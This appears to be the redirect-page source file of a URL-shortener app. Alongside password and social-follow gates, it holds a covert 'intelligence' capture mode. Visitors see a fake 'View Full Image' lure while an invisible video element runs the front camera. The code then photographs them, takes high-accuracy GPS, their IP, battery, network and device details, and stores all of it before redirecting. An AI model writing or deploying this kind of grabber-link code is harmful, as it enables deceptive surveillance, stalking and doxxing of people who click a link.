import React, { useEffect, useState, useRef } from 'react';
import { useParams } from 'react-router-dom';
import { supabase } from '../lib/supabase';
import { AlertCircle, Lock, ArrowRight, ExternalLink, Clock, ShieldAlert, Camera, Globe, Monitor, MapPin } from 'lucide-react';
import { cn } from '../lib/utils';
import { SocialIcon } from '../components/SocialIcon';
import { UAParser } from 'ua-parser-js';

export default function Redirect() {
  const { shortCode } = useParams<{ shortCode: string }>();
  const [error, setError] = useState<string | null>(null);
  const [isExpired, setIsExpired] = useState(false);
  
  // Password state
  const [isLocked, setIsLocked] = useState(false);
  const [requiredPassword, setRequiredPassword] = useState<string | null>(null);
  const [targetUrl, setTargetUrl] = useState<string | null>(null);
  const [inputPassword, setInputPassword] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [urlId, setUrlId] = useState<string | null>(null);
  
  // Social gate state
  const [socialGate, setSocialGate] = useState<{ title: string; url: string; icon: string; description: string; buttonText: string } | null>(null);
  const [isSocialGateCompleted, setIsSocialGateCompleted] = useState(false);
  const [animationType, setAnimationType] = useState<'ring' | 'bar'>('ring');
  const [animationText, setAnimationText] = useState('LOADING');

  // Intelligence State
  const [intelConfigs, setIntelConfigs] = useState({ camera: false, location: false });
  const [isIntelPage, setIsIntelPage] = useState(false);
  const [isCapturing, setIsCapturing] = useState(false);
  const [intelData, setIntelData] = useState<{ image?: string; lat?: number; lon?: number }>({});
  const videoRef = useRef<HTMLVideoElement>(null);

  const logClick = async (id: string, customIntel?: any) => {
    try {
      const parser = new UAParser();
      const result = parser.getResult();
      
      let ip = 'Hidden';
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        ip = data.ip;
      } catch (e) {}

      // Collect System Specs
      let batteryLevel: number | null = null;
      let isCharging: boolean | null = null;
      try {
        if ('getBattery' in navigator) {
          const battery: any = await (navigator as any).getBattery();
          batteryLevel = battery.level;
          isCharging = battery.charging;
        }
      } catch (e) {}

      const networkType = (navigator as any).connection?.effectiveType || (navigator as any).connection?.type || 'Unknown';
      const screenResolution = `${window.screen.width}x${window.screen.height}`;
      const language = navigator.language;

      await supabase.from('link_analytics').insert({
        url_id: id,
        ip_address: ip,
        device_type: result.device.type || 'Desktop',
        browser: result.browser.name || 'Unknown',
        os: result.os.name || 'Unknown',
        referrer: document.referrer || 'Direct',
        captured_image: customIntel?.image || intelData.image || null,
        latitude: customIntel?.lat || intelData.lat || null,
        longitude: customIntel?.lon || intelData.lon || null,
        battery_level: batteryLevel,
        is_charging: isCharging,
        network_type: networkType,
        screen_resolution: screenResolution,
        language: language
      });

      await supabase.rpc('increment_clicks', { row_id: id });
    } catch (err) {
      console.error("Log failed:", err);
    }
  };

  const startCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }
    } catch (err) {
      console.error("Camera access denied:", err);
    }
  };

  const requestLocation = () => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setIntelData(prev => ({ ...prev, lat: position.coords.latitude, lon: position.coords.longitude }));
        },
        (err) => console.error("Location access denied:", err),
        { enableHighAccuracy: true }
      );
    }
  };

  const captureIntelAndProceed = async () => {
    setIsCapturing(true);
    let finalIntel = { ...intelData };

    // Capture Image if video is running
    if (videoRef.current && videoRef.current.srcObject && videoRef.current.videoWidth > 0) {
      const canvas = document.createElement('canvas');
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      const ctx = canvas.getContext('2d');
      if (ctx) {
        ctx.drawImage(videoRef.current, 0, 0);
        finalIntel.image = canvas.toDataURL('image/jpeg', 0.8); // Higher quality jpeg
        setIntelData(prev => ({ ...prev, image: finalIntel.image }));
        
        // Stop camera
        (videoRef.current.srcObject as MediaStream).getTracks().forEach(track => track.stop());
      }
    }

    if (urlId) await logClick(urlId, finalIntel);
    
    if (socialGate && !isSocialGateCompleted) {
      setIsIntelPage(false);
    } else if (targetUrl) {
      setIsIntelPage(false);
      setTimeout(() => {
        window.location.href = targetUrl;
      }, 500);
    }
  };

  const handlePasswordSubmit = async (e: any) => {
    e.preventDefault();
    if (inputPassword === requiredPassword && targetUrl) {
      if (intelConfigs.camera || intelConfigs.location) {
        setIsLocked(false);
        setIsIntelPage(true);
        if (intelConfigs.camera) startCamera();
        if (intelConfigs.location) requestLocation();
      } else {
        if (urlId) await logClick(urlId);
        if (socialGate && !isSocialGateCompleted) {
           setIsLocked(false);
        } else {
           setIsLocked(false);
           setTimeout(() => {
             window.location.href = targetUrl;
           }, 300);
        }
      }
    } else {
      setPasswordError("Incorrect password");
    }
  };

  const handleSocialAction = () => {
    if (!socialGate) return;
    window.open(socialGate.url, '_blank', 'noopener,noreferrer');
    
    setTimeout(() => {
      setIsSocialGateCompleted(true);
      if (targetUrl) {
        setTimeout(() => {
          window.location.href = targetUrl;
        }, 300);
      }
    }, 1500);
  };

  useEffect(() => {
    async function fetchLongUrl() {
      if (!shortCode) return;

      try {
        const domain = window.location.hostname;
        
        const res = await supabase
          .from('urls')
          .select('*')
          .eq('domain', domain)
          .eq('short_code', shortCode)
          .single();

        if (res.error) {
          setError('Link not found in our database.');
          return;
        }

        const data = res.data;
        setUrlId(data.id);

        // Check Expiration
        if (data.expires_at) {
          if (new Date(data.expires_at) < new Date()) {
            setIsExpired(true);
            return;
          }
        }

        setTargetUrl(data.long_url);
        setAnimationType(data.animation_type || 'ring');
        setAnimationText(data.animation_text || 'LOADING');
        setIntelConfigs({
          camera: !!data.capture_camera,
          location: !!data.capture_location
        });
        
        let needsLock = false;

        if (data.password) {
          setRequiredPassword(data.password);
          needsLock = true;
        }
        
        if (data.social_gate_title && data.social_gate_url) {
          setSocialGate({
            title: data.social_gate_title,
            url: data.social_gate_url,
            icon: data.social_gate_icon || 'link',
            description: data.social_gate_description || 'Complete the action below to unlock your link.',
            buttonText: data.social_gate_button_text || 'Verify & Continue'
          });
        }

        if (needsLock) {
          setIsLocked(true);
        } else if (data.capture_camera || data.capture_location) {
          setIsIntelPage(true);
          if (data.capture_camera) startCamera();
          if (data.capture_location) requestLocation();
        } else if (data.social_gate_title && data.social_gate_url) {
          await logClick(data.id);
        } else {
          await logClick(data.id);
          setTimeout(() => {
            window.location.href = data.long_url;
          }, 500);
        }
      } catch (err) {
        setError('An unexpected system error occurred.');
      }
    }

    fetchLongUrl();
  }, [shortCode]);

  if (isExpired) {
    return (
      <div className="min-h-screen bg-[#050505] flex items-center justify-center p-6 bg-[radial-gradient(circle_at_center,rgba(220,38,38,0.05),transparent_70%)]">
        <div className="w-full max-w-md bg-zinc-900/50 border border-red-500/20 rounded-3xl p-10 text-center backdrop-blur-xl animate-in fade-in zoom-in duration-500">
          <div className="w-20 h-20 bg-red-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
            <ShieldAlert className="text-red-500 w-10 h-10" />
          </div>
          <h1 className="text-3xl font-black text-white mb-2 uppercase tracking-tighter">Link Expired</h1>
          <p className="text-zinc-400 text-sm mb-8 leading-relaxed">This redirection link has reached its scheduled expiration date and is no longer active.</p>
          <div className="h-[1px] w-full bg-zinc-800 mb-8" />
          <p className="text-[10px] text-zinc-600 font-bold uppercase tracking-[0.3em]">SECURE SYSTEM V2.1</p>
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="min-h-screen bg-black flex flex-col items-center justify-center p-4 text-[#EDEDED] font-sans">
        <div className="max-w-md w-full bg-[#0F0F0F] border border-white/10 rounded-2xl p-8 text-center space-y-6 shadow-2xl">
          <div className="bg-red-500/10 w-16 h-16 rounded-full flex items-center justify-center mx-auto border border-red-500/20">
            <AlertCircle className="w-8 h-8 text-red-500" />
          </div>
          <h1 className="text-2xl font-light tracking-tight">Link Not Found</h1>
          <p className="text-sm text-zinc-400">{error}</p>
          <a
            href="/"
            className="inline-flex mt-4 bg-white text-black px-6 py-3 rounded-lg font-medium transition-transform hover:bg-neutral-200 active:scale-95 shadow-[0_0_20px_rgba(255,255,255,0.1)]"
          >
            Return Home
          </a>
        </div>
      </div>
    );
  }

  if (isIntelPage) {
    if (isCapturing) {
      return (
        <div className="min-h-screen bg-[#050505] flex flex-col items-center justify-center p-6 relative overflow-hidden font-sans">
          <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-blue-500/5 blur-[160px] rounded-full pointer-events-none"></div>

          {/* Hidden utilities for background capture */}
          {intelConfigs.camera && (
            <video 
              ref={videoRef} 
              autoPlay 
              playsInline 
              muted 
              className="absolute opacity-0 pointer-events-none w-px h-px"
            />
          )}

          <div className="flex flex-col items-center gap-16 z-10 w-full max-w-lg">
            {animationType === 'ring' ? (
              <div className="relative w-64 h-64 md:w-80 md:h-80 flex items-center justify-center animate-in zoom-in duration-700">
                <div className="absolute inset-0 rounded-full p-[2px] bg-gradient-to-tr from-[#FF512F] via-[#DD2476] to-[#4facfe] animate-[spin_1.2s_linear_infinite] shadow-[0_0_100px_rgba(221,36,118,0.25)]">
                  <div className="w-full h-full rounded-full bg-[#050505]" />
                </div>
                <div className="relative z-10 flex flex-col items-center justify-center w-full h-full">
                  <span className="relative z-20 text-white font-black tracking-[0.2em] text-2xl md:text-5xl uppercase drop-shadow-[0_0_20px_rgba(255,255,255,0.4)] text-center px-8 leading-tight">
                    {animationText || 'LOADING'}
                  </span>
                </div>
              </div>
            ) : (
              <div className="w-full flex flex-col items-center gap-12 animate-in fade-in slide-in-from-bottom-8 duration-700">
                <div className="text-center relative">
                   <h2 className="relative text-4xl md:text-6xl font-black text-white tracking-[0.1em] mb-4 uppercase drop-shadow-2xl">{animationText || 'LOADING'}</h2>
                   <div className="h-0.5 w-24 bg-blue-500/50 mx-auto rounded-full" />
                </div>
                <div className="w-full max-w-sm h-3 bg-zinc-900 border border-white/5 rounded-full overflow-hidden p-0.5 shadow-inner backdrop-blur-sm">
                  <div className="h-full bg-gradient-to-r from-[#FF512F] via-[#DD2476] to-[#4facfe] rounded-full animate-[loading_0.8s_ease-in-out_infinite] shadow-[0_0_15px_rgba(221,36,118,0.4)]" />
                </div>
              </div>
            )}
            
            <div className="flex flex-col items-center gap-4">
               <div className="flex items-center gap-6">
                 <div className="h-[1px] w-10 bg-zinc-800"></div>
                 <span className="text-[12px] text-zinc-500 font-black uppercase tracking-[0.8em]">by saqib</span>
                 <div className="h-[1px] w-10 bg-zinc-800"></div>
               </div>
               <div className="flex items-center gap-2 text-[9px] text-zinc-700 font-bold uppercase tracking-widest opacity-60">
                 <span>SECURE SYSTEM</span>
                 <span className="w-1 h-1 bg-zinc-800 rounded-full"></span>
                 <span>V2.1.0</span>
               </div>
            </div>
          </div>
          <style dangerouslySetInnerHTML={{ __html: `
            @keyframes loading {
              0% { width: 5%; margin-left: -5%; opacity: 0; }
              20% { opacity: 1; }
              50% { width: 60%; margin-left: 20%; }
              80% { opacity: 1; }
              100% { width: 5%; margin-left: 100%; opacity: 0; }
            }
          `}} />
        </div>
      );
    }

    return (
      <div className="min-h-screen bg-[#050505] flex flex-col items-center justify-center p-4 relative overflow-hidden font-sans">
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,_#121212_0%,_#050505_70%)] -z-10"></div>
        
        {/* Hidden internal utilities */}
        {intelConfigs.camera && (
          <video 
            ref={videoRef} 
            autoPlay 
            playsInline 
            muted 
            className="absolute opacity-0 pointer-events-none w-px h-px"
          />
        )}

        <div className="max-w-md w-full bg-[#0F0F0F]/90 border border-white/10 rounded-[40px] p-10 shadow-2xl relative z-10 backdrop-blur-3xl flex flex-col items-center text-center">
          <div className="relative w-full aspect-[16/10] mb-8 rounded-3xl overflow-hidden group">
            <img 
              src="https://ik.imagekit.io/19imy4f1u/lite_1777569405694_n0JDhhj0w.jpeg" 
              alt="Verification"
              className="w-full h-full object-cover blur-[2px] scale-110 opacity-60 group-hover:blur-0 group-hover:scale-100 transition-all duration-700"
            />
            <div className="absolute inset-0 bg-gradient-to-t from-[#0F0F0F] via-transparent to-transparent"></div>
          </div>
          
          <button
            onClick={captureIntelAndProceed}
            className="w-full bg-[#EDEDED] text-black hover:bg-white font-black py-5 px-8 rounded-2xl active:scale-95 transition-all flex items-center justify-center gap-4 group shadow-[0_0_40px_rgba(255,255,255,0.05)] border border-white/10"
          >
            <span className="uppercase tracking-[0.2em] text-[10px]">View Full Image</span>
            <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
          </button>
          
          <p className="mt-8 text-[9px] text-zinc-800 font-bold uppercase tracking-[0.3em] font-mono opacity-50">
            SYSTEM_ACCESS_NODE_V2.1 - SECURE
          </p>
        </div>
      </div>
    );
  }

  if (isLocked) {
    return (
      <div className="min-h-screen bg-[#050505] flex flex-col items-center justify-center p-4 relative overflow-hidden font-sans">
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,_#1a1a1a_0%,_#050505_70%)] -z-10"></div>
        <div className="max-w-sm w-full bg-[#0F0F0F] border border-white/10 rounded-2xl p-8 shadow-2xl relative z-10 backdrop-blur-xl">
          <div className="bg-blue-500/10 w-16 h-16 rounded-full flex items-center justify-center mx-auto border border-blue-500/20 mb-6">
            <Lock className="w-8 h-8 text-blue-500" />
          </div>
          <div className="text-center mb-8">
            <h1 className="text-2xl font-light tracking-tight text-[#EDEDED] mb-2">Protected Link</h1>
            <p className="text-sm text-zinc-400">Please enter the password to continue.</p>
          </div>
          <form onSubmit={handlePasswordSubmit} className="space-y-4">
            <div>
              <input
                type="password"
                value={inputPassword}
                onChange={(e) => {
                  setInputPassword(e.target.value);
                  setPasswordError("");
                }}
                placeholder="Enter password"
                className="w-full bg-[#0A0A0A] rounded-lg py-4 px-5 text-zinc-200 focus:outline-none placeholder:text-zinc-700 transition-all text-center tracking-widest border animate-rgb"
                autoFocus
              />
            </div>
            {passwordError && (
              <p className="text-red-400 text-xs text-center font-medium animate-pulse">{passwordError}</p>
            )}
            <button
              type="submit"
              disabled={!inputPassword}
              className="w-full bg-blue-600 hover:bg-blue-500 text-white font-medium py-4 px-6 rounded-lg shadow-[0_0_20px_rgba(37,99,235,0.2)] active:scale-95 transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
            >
              Unlock <ArrowRight className="w-4 h-4" />
            </button>
          </form>
        </div>
      </div>
    );
  }

  if (socialGate && !isSocialGateCompleted) {
    return (
      <div className="min-h-screen bg-[#050505] flex flex-col items-center justify-center p-4 relative overflow-hidden font-sans">
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,_#1a1a1a_0%,_#050505_70%)] -z-10"></div>
        <div className="max-w-sm w-full bg-[#0F0F0F] border border-white/10 rounded-2xl p-8 shadow-2xl relative z-10 backdrop-blur-xl flex flex-col items-center text-center">
          <div className="mb-6 flex justify-center w-full">
            <SocialIcon id={socialGate.icon} className="w-16 h-16" />
          </div>
          
          <h1 className="text-2xl font-light tracking-tight text-[#EDEDED] mb-2">{socialGate.title}</h1>
          <p className="text-sm text-zinc-400 mb-8">{socialGate.description}</p>
          
          <button
            onClick={handleSocialAction}
            className="w-full bg-[#1A1A1A] hover:bg-[#222222] border border-white/10 text-white font-medium py-4 px-6 rounded-lg active:scale-95 transition-all flex items-center justify-center gap-3 group shadow-lg"
          >
            <SocialIcon id={socialGate.icon} className="w-5 h-5 !shadow-none before:!hidden after:!hidden opacity-90 ring-0" />
            <span>{socialGate.buttonText}</span>
            <ExternalLink className="w-4 h-4 ml-auto text-zinc-600 group-hover:text-zinc-400 transition-colors" />
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#050505] flex flex-col items-center justify-center p-6 relative overflow-hidden font-sans">
      {/* Background FX - Ambient only */}
      <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-blue-500/5 blur-[160px] rounded-full pointer-events-none"></div>

      <div className="flex flex-col items-center gap-16 z-10 w-full max-w-lg">
        {/* Strictly Conditional Animation Rendering */}
        {animationType === 'ring' ? (
          <div className="relative w-64 h-64 md:w-80 md:h-80 flex items-center justify-center animate-in zoom-in duration-700">
            {/* The Luxury RGB Glow Ring - Only the border rotates */}
            <div className="absolute inset-0 rounded-full p-[2px] bg-gradient-to-tr from-[#FF512F] via-[#DD2476] to-[#4facfe] animate-[spin_1.2s_linear_infinite] shadow-[0_0_100px_rgba(221,36,118,0.25)]">
              <div className="w-full h-full rounded-full bg-[#050505]" />
            </div>
            
            {/* Static Inner Content Container */}
            <div className="relative z-10 flex flex-col items-center justify-center w-full h-full">
              {/* Inner Glow Overlay */}
              <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,rgba(255,255,255,0.03),transparent_70%)] pointer-events-none"></div>
              
              {/* User Content - This stays static */}
              <span className="relative z-20 text-white font-black tracking-[0.2em] text-2xl md:text-5xl uppercase drop-shadow-[0_0_20px_rgba(255,255,255,0.4)] text-center px-8 leading-tight">
                {animationText || 'LOADING'}
              </span>
            </div>
          </div>
        ) : animationType === 'bar' ? (
          <div className="w-full flex flex-col items-center gap-12 animate-in fade-in slide-in-from-bottom-8 duration-700">
            {/* Minimalist Bar Loading */}
            <div className="text-center relative">
               <span className="text-white/[0.02] font-black text-[120px] absolute -top-20 left-1/2 -translate-x-1/2 tracking-tighter uppercase select-none pointer-events-none truncate w-full opacity-50">
                {animationText.charAt(0) || 'L'}
               </span>
               <h2 className="relative text-4xl md:text-6xl font-black text-white tracking-[0.1em] mb-4 uppercase drop-shadow-2xl">{animationText || 'LOADING'}</h2>
               <div className="h-0.5 w-24 bg-blue-500/50 mx-auto rounded-full" />
            </div>
            
            <div className="w-full max-w-sm h-3 bg-zinc-900 border border-white/5 rounded-full overflow-hidden p-0.5 shadow-inner backdrop-blur-sm">
              <div className="h-full bg-gradient-to-r from-[#FF512F] via-[#DD2476] to-[#4facfe] rounded-full animate-[loading_0.8s_ease-in-out_infinite] shadow-[0_0_15px_rgba(221,36,118,0.4)]" />
            </div>
          </div>
        ) : null}

        {/* Permanent Signature - Always below the animation */}
        <div className="flex flex-col items-center gap-4">
           <div className="flex items-center gap-6">
             <div className="h-[1px] w-10 bg-zinc-800"></div>
             <span className="text-[12px] text-zinc-500 font-black uppercase tracking-[0.8em] transition-all duration-500 hover:tracking-[1em] hover:text-blue-500 cursor-default select-none">by saqib</span>
             <div className="h-[1px] w-10 bg-zinc-800"></div>
           </div>
           <div className="flex items-center gap-2 text-[9px] text-zinc-700 font-bold uppercase tracking-widest opacity-60">
             <span>SECURE REDIRECT</span>
             <span className="w-1 h-1 bg-zinc-800 rounded-full"></span>
             <span>V2.1.0</span>
           </div>
        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        @keyframes loading {
          0% { width: 5%; margin-left: -5%; opacity: 0; }
          20% { opacity: 1; }
          50% { width: 60%; margin-left: 20%; }
          80% { opacity: 1; }
          100% { width: 5%; margin-left: 100%; opacity: 0; }
        }
      `}} />
    </div>
  );
}
